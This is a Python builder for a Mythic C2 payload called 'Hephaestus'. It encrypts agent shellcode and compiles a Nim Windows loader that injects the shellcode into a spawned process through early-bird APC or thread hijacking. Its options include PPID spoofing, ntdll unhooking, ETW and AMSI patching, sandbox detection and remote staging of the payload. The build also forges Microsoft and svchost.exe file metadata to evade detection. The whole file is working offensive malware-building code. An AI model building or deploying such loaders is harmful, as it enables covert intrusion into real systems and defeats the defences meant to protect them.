from mythic_container.PayloadBuilder import *
import os
import shutil
import subprocess
import tempfile
import random
import pathlib
import traceback
import base64
import datetime
import zipfile
import io


def _rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    x = j = 0
    out = []
    for b in data:
        x = (x + 1) & 0xFF
        j = (j + S[x]) & 0xFF
        S[x], S[j] = S[j], S[x]
        out.append(b ^ S[(S[x] + S[j]) & 0xFF])
    return bytes(out)


def _nim_bytes(data: bytes) -> str:
    return "[" + ", ".join(f"0x{b:02x}'u8" for b in data) + "]"


class Hephaestus(PayloadType):
    name = "hephaestus"
    file_extension = "zip"
    author = "@0xbbuddha"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["aphrodite"]
    supports_dynamic_loading = False
    mythic_encrypts = True
    build_parameters = [
        BuildParameter(
            name="encryption_type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Shellcode encryption inside the loader",
            choices=["rc4", "xor", "none"],
            default_value="rc4",
        ),
        BuildParameter(
            name="encryption_key",
            parameter_type=BuildParameterType.String,
            description="Encryption key (leave empty for random 16-byte key)",
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="target_process",
            parameter_type=BuildParameterType.String,
            description="Process to spawn suspended for shellcode injection",
            default_value="C:\\Windows\\System32\\notepad.exe",
        ),
        BuildParameter(
            name="injection_technique",
            parameter_type=BuildParameterType.ChooseOne,
            description="earlybird: APC queue before entry point | threadhijack: RIP redirect",
            choices=["earlybird", "threadhijack"],
            default_value="earlybird",
        ),
        BuildParameter(
            name="ppid_spoof",
            parameter_type=BuildParameterType.Boolean,
            description="Spoof PPID to appear as explorer.exe child",
            default_value=True,
        ),
        BuildParameter(
            name="use_unhook",
            parameter_type=BuildParameterType.Boolean,
            description="Remap ntdll .text section from clean disk copy to remove EDR hooks before injection",
            default_value=True,
        ),
        BuildParameter(
            name="use_etw_patch",
            parameter_type=BuildParameterType.Boolean,
            description="Patch EtwEventWrite (xor eax,eax; ret) before injection",
            default_value=True,
        ),
        BuildParameter(
            name="use_amsi_patch",
            parameter_type=BuildParameterType.Boolean,
            description="Patch AmsiScanBuffer before injection",
            default_value=False,
        ),
        BuildParameter(
            name="use_sandbox_check",
            parameter_type=BuildParameterType.Boolean,
            description="Basic sandbox detection (uptime, RAM, CPU count, sleep skipping)",
            default_value=True,
        ),
        BuildParameter(
            name="wipe_memory",
            parameter_type=BuildParameterType.Boolean,
            description="Zero shellcode buffer in heap after injection",
            default_value=True,
        ),
        BuildParameter(
            name="memory_technique",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Shellcode memory allocation technique in the target process. "
                "virtualalloc: classic VirtualAllocEx (triggers NtAllocateVirtualMemory ETW MWTI). "
                "ntmapview: NtCreateSection+NtMapViewOfSection (pagefile-backed section, "
                "avoids MWTI ETW event — harder to detect with Elastic EDR)."
            ),
            choices=["virtualalloc", "ntmapview"],
            default_value="ntmapview",
        ),
        BuildParameter(
            name="debug_mode",
            parameter_type=BuildParameterType.Boolean,
            description="Debug build: console window + verbose nim output (do NOT use in production)",
            default_value=False,
        ),
        BuildParameter(
            name="staging_url",
            parameter_type=BuildParameterType.String,
            description=(
                "Staged loading: URL where the encrypted payload blob is hosted "
                "(e.g. http://10.0.0.1:80/update.dat). When set, the PE embeds NO payload — "
                "shellcode is downloaded at runtime. Dramatically reduces ML detection score. "
                "Leave empty to embed payload in the binary (legacy mode)."
            ),
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="file_description",
            parameter_type=BuildParameterType.String,
            description="PE VERSIONINFO FileDescription (shown in Explorer details pane)",
            default_value="Windows Service Host Process",
            required=False,
        ),
        BuildParameter(
            name="company_name",
            parameter_type=BuildParameterType.String,
            description="PE VERSIONINFO CompanyName",
            default_value="Microsoft Corporation",
            required=False,
        ),
        BuildParameter(
            name="original_filename",
            parameter_type=BuildParameterType.String,
            description="PE VERSIONINFO OriginalFilename (the .exe name embedded in resource)",
            default_value="svchost.exe",
            required=False,
        ),
    ]

    agent_code_path = pathlib.Path(__file__).parent.parent / "agent_code"

    async def build(self) -> BuildResponse:
        build_stdout = ""
        build_stderr = ""

        try:
            payload_bytes = self.wrapped_payload
            build_stdout += f"[*] wrapped_payload type: {type(payload_bytes)}, len: {len(payload_bytes) if payload_bytes else 0}\n"

            if not payload_bytes:
                build_stderr += (
                    "ERROR: No shellcode received.\n"
                    "Build Aphrodite with target_os=windows and output_format=shellcode first,\n"
                    "then select that payload when creating the Hephaestus wrapper.\n"
                )
                return BuildResponse(
                    status=BuildStatus.Error,
                    build_stdout=build_stdout,
                    build_stderr=build_stderr,
                )

            enc_type       = self.get_parameter("encryption_type") or "rc4"
            enc_key_param  = (self.get_parameter("encryption_key") or "").strip()
            target_process = (self.get_parameter("target_process") or "C:\\Windows\\System32\\notepad.exe").strip()
            inj_tech       = self.get_parameter("injection_technique") or "earlybird"
            ppid_spoof     = self.get_parameter("ppid_spoof") or False
            use_unhook     = self.get_parameter("use_unhook") or False
            use_etw        = self.get_parameter("use_etw_patch") or False
            use_amsi       = self.get_parameter("use_amsi_patch") or False
            use_sandbox    = self.get_parameter("use_sandbox_check") or False
            wipe           = self.get_parameter("wipe_memory") or False
            mem_tech       = self.get_parameter("memory_technique") or "ntmapview"
            debug          = self.get_parameter("debug_mode") or False
            staging_url    = (self.get_parameter("staging_url") or "").strip()
            staged         = bool(staging_url)
            file_desc      = (self.get_parameter("file_description") or "System Maintenance Utility").strip()
            company        = (self.get_parameter("company_name") or "System Tools LLC").strip()
            orig_fname     = (self.get_parameter("original_filename") or "SysMaint.exe").strip()

            build_stdout += f"[*] enc={enc_type} inj={inj_tech} mem={mem_tech} ppid={ppid_spoof} unhook={use_unhook} etw={use_etw} amsi={use_amsi} sandbox={use_sandbox} wipe={wipe} debug={debug}\n"
            build_stdout += f"[*] target: {target_process}\n"
            build_stdout += f"[*] shellcode size: {len(payload_bytes):,} bytes\n"

            key_bytes = enc_key_param.encode() if enc_key_param else \
                        bytes(random.getrandbits(8) for _ in range(16))

            if enc_type == "rc4":
                encrypted = _rc4(key_bytes, payload_bytes)
                build_stdout += f"[*] RC4 encrypted, key={key_bytes.hex()}\n"
            elif enc_type == "xor":
                encrypted = bytes(payload_bytes[i] ^ key_bytes[i % len(key_bytes)]
                                  for i in range(len(payload_bytes)))
                build_stdout += f"[*] XOR encrypted, key={key_bytes.hex()}\n"
            else:
                encrypted = payload_bytes
                build_stdout += "[*] No encryption\n"

            src_template = self.agent_code_path / "Hephaestus_Main.nim"
            build_stdout += f"[*] Template path: {src_template}\n"
            if not src_template.exists():
                build_stderr += f"ERROR: Template not found at {src_template}\n"
                return BuildResponse(
                    status=BuildStatus.Error,
                    build_stdout=build_stdout,
                    build_stderr=build_stderr,
                )

            tmpdir = tempfile.mkdtemp(prefix="hephaestus_build_")
            build_stdout += f"[*] Build tmpdir: {tmpdir}\n"

            try:
                if staged:
                    # Staged mode: payload NOT embedded in the PE.
                    # Write a dummy payload.b64 so staticRead compiles (never used at runtime).
                    with open(os.path.join(tmpdir, "payload.b64"), "w") as f:
                        f.write("")
                    # Write the encrypted payload separately for the operator to host.
                    staging_blob_path = os.path.join(tmpdir, "payload_staging.bin")
                    with open(staging_blob_path, "wb") as f:
                        f.write(encrypted)
                    build_stdout += (
                        f"[*] STAGED MODE: no payload embedded in PE\n"
                        f"[*] Host the staging blob at: {staging_url}\n"
                        f"[*] Staging blob size: {len(encrypted):,} bytes\n"
                    )
                else:
                    # Embedded mode: base64-encode to reduce section entropy (~8.0 -> ~6.0 bits/byte)
                    payload_b64 = base64.b64encode(encrypted).decode("ascii")
                    with open(os.path.join(tmpdir, "payload.b64"), "w") as f:
                        f.write(payload_b64)
                    build_stdout += f"[*] Payload base64-encoded: {len(payload_b64):,} chars (embedded)\n"

                keys_nim = self._generate_keys_nim(enc_type, key_bytes, target_process, staging_url)
                with open(os.path.join(tmpdir, "keys.nim"), "w") as f:
                    f.write(keys_nim)
                build_stdout += f"[*] keys.nim:\n{keys_nim}\n"

                shutil.copy(src_template, os.path.join(tmpdir, "hephaestus_main.nim"))

                exe_path = os.path.join(tmpdir, "Hephaestus.exe")
                nim_env = {
                    **os.environ,
                    "PATH": "/opt/nim/bin:/root/.nimble/bin:" + os.environ.get("PATH", ""),
                    "HOME": "/root",
                }

                nim_flags = [
                    "nim", "c",
                    "--os:windows", "--cpu:amd64", "-d:mingw",
                    "--gcc.exe:x86_64-w64-mingw32-gcc",
                    "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
                    "--opt:size",
                    "--verbosity:1",
                    "--hints:off",
                    "--warnings:off",
                    "--threads:off",
                    f"--path:{tmpdir}",
                    f"--out:{exe_path}",
                ]

                if debug:
                    nim_flags.append("-d:debug")
                else:
                    nim_flags += ["-d:release", "-d:strip",
                                  "--passL:-mwindows", "--passL:-s"]

                if enc_type == "rc4":   nim_flags.append("-d:useRc4")
                elif enc_type == "xor": nim_flags.append("-d:useXor")
                if ppid_spoof:          nim_flags.append("-d:ppidSpoof")
                if use_unhook:          nim_flags.append("-d:unhook")
                if use_etw:             nim_flags.append("-d:etwPatch")
                if use_amsi:            nim_flags.append("-d:amsiPatch")
                if use_sandbox:         nim_flags.append("-d:sandboxCheck")
                if inj_tech == "threadhijack": nim_flags.append("-d:threadHijack")
                if wipe:                nim_flags.append("-d:wipe")
                if mem_tech == "ntmapview": nim_flags.append("-d:mapInject")
                if staged:                  nim_flags.append("-d:staged")

                # -- VERSIONINFO resource: adds PE metadata, improves ML scoring --
                year = datetime.datetime.now().year
                rc_content = f"""\
1 VERSIONINFO
FILEVERSION     1,0,0,0
PRODUCTVERSION  1,0,0,0
FILEOS          0x40004L
FILETYPE        0x1L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "{company}"
            VALUE "FileDescription",  "{file_desc}"
            VALUE "FileVersion",      "1.0.0.0"
            VALUE "InternalName",     "{os.path.splitext(orig_fname)[0]}"
            VALUE "LegalCopyright",   "Copyright (C) {year} {company}"
            VALUE "OriginalFilename", "{orig_fname}"
            VALUE "ProductName",      "{file_desc}"
            VALUE "ProductVersion",   "1.0.0.0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 1200
    END
END
"""
                rc_path  = os.path.join(tmpdir, "resource.rc")
                res_path = os.path.join(tmpdir, "resource.o")
                with open(rc_path, "w") as f:
                    f.write(rc_content)

                windres_result = subprocess.run(
                    ["x86_64-w64-mingw32-windres", "-i", rc_path, "-o", res_path],
                    capture_output=True, text=True, timeout=30, cwd=tmpdir, env=nim_env
                )
                if windres_result.returncode == 0:
                    nim_flags.append(f"--passL:{res_path}")
                    build_stdout += "[*] VERSIONINFO resource compiled and linked\n"
                else:
                    build_stdout += f"[!] windres failed - building without VERSIONINFO resource\n"
                    if windres_result.stderr:
                        build_stdout += f"    {windres_result.stderr[:300]}\n"

                nim_flags.append(os.path.join(tmpdir, "hephaestus_main.nim"))

                build_stdout += f"[*] nim command: {' '.join(nim_flags)}\n"

                result = subprocess.run(
                    nim_flags,
                    capture_output=True,
                    text=True,
                    timeout=300,
                    cwd=tmpdir,
                    env=nim_env,
                )

                if result.stdout: build_stdout += result.stdout
                if result.stderr: build_stderr += result.stderr

                if result.returncode != 0:
                    build_stderr += f"\nNim compilation failed (exit code {result.returncode})\n"
                    return BuildResponse(
                        status=BuildStatus.Error,
                        build_stdout=build_stdout,
                        build_stderr=build_stderr,
                    )

                if not os.path.exists(exe_path):
                    build_stderr += f"ERROR: Binary not found at {exe_path} after compilation\n"
                    return BuildResponse(
                        status=BuildStatus.Error,
                        build_stdout=build_stdout,
                        build_stderr=build_stderr,
                    )

                with open(exe_path, "rb") as f:
                    exe_bytes = f.read()

                features = [enc_type.upper()]
                if staged:             features.append("STAGED")
                if ppid_spoof:         features.append("ppid-spoof")
                if use_unhook:         features.append("unhook-ntdll")
                if use_etw:            features.append("etw-patch")
                if use_amsi:           features.append("amsi-patch")
                if use_sandbox:        features.append("sandbox-check")
                features.append(inj_tech)
                features.append(mem_tech)
                if wipe:               features.append("wipe")
                if debug:              features.append("DEBUG")

                buf = io.BytesIO()
                with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                    zf.write(exe_path, "hephaestus.exe")
                    if staged:
                        zf.write(staging_blob_path, "payload_staging.bin")
                        readme = (
                            f"Staged Hephaestus\n"
                            f"=================\n"
                            f"1. Host payload_staging.bin (encrypted shellcode) at:\n"
                            f"   {staging_url}\n"
                            f"2. Run hephaestus.exe on the target.\n"
                            f"   It downloads and decrypts the payload at runtime.\n"
                            f"   No shellcode is embedded in the exe.\n"
                        )
                        zf.writestr("README.txt", readme)
                        build_stdout += (
                            f"[+] Build successful (STAGED): exe={len(exe_bytes):,} bytes, "
                            f"blob={os.path.getsize(staging_blob_path):,} bytes\n"
                        )
                    else:
                        build_stdout += f"[+] Build successful: {len(exe_bytes):,} bytes\n"
                binary = buf.getvalue()
                build_stdout += f"[+] Zip: {len(binary):,} bytes\n"

                return BuildResponse(
                    status=BuildStatus.Success,
                    payload=binary,
                    build_message=f"Hephaestus [{', '.join(features)}] -> {target_process}",
                    build_stdout=build_stdout,
                    build_stderr=build_stderr,
                )

            finally:
                shutil.rmtree(tmpdir, ignore_errors=True)

        except Exception as e:
            build_stderr += f"Unhandled exception: {e}\n"
            build_stderr += traceback.format_exc()
            return BuildResponse(
                status=BuildStatus.Error,
                build_stdout=build_stdout,
                build_stderr=build_stderr,
            )

    @staticmethod
    def _generate_keys_nim(enc_type: str, key_bytes: bytes, target_process: str,
                           staging_url: str = "") -> str:
        target_escaped = target_process.replace("\\", "\\\\").replace('"', '\\"')
        url_escaped    = staging_url.replace('"', '\\"')
        lines = [
            "# keys.nim - Auto-generated by Hephaestus builder. DO NOT EDIT.",
            "",
            f'const targetProcess* = "{target_escaped}"',
            "",
        ]
        if staging_url:
            lines.append(f'const stagingUrl* = "{url_escaped}"')
            lines.append("")
        if enc_type == "rc4":
            lines.append(f"const rc4Key*: array[{len(key_bytes)}, byte] = {_nim_bytes(key_bytes)}")
        elif enc_type == "xor":
            lines.append(f"const xorKey*: array[{len(key_bytes)}, byte] = {_nim_bytes(key_bytes)}")
        return "\n".join(lines) + "\n"
